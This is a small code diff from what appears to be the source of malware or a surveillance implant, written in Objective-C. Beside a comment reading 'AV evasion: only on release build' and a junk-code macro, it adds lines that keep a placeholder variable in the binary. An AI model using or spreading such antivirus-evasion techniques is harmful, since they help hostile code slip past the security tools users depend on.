@@ -40,6 +40,8 @@ int main (int argc, const char *argv[])
  
   // AV evasion: only on release build
   AV_GARBAGE_000
+  char* _unused_infoPlaceHolder = infoPlaceHolder;
+  _unused_infoPlaceHolder++;
   
 #ifdef ENABLE_LOGGING
   [__m_MLogger setComponent: @"core"];
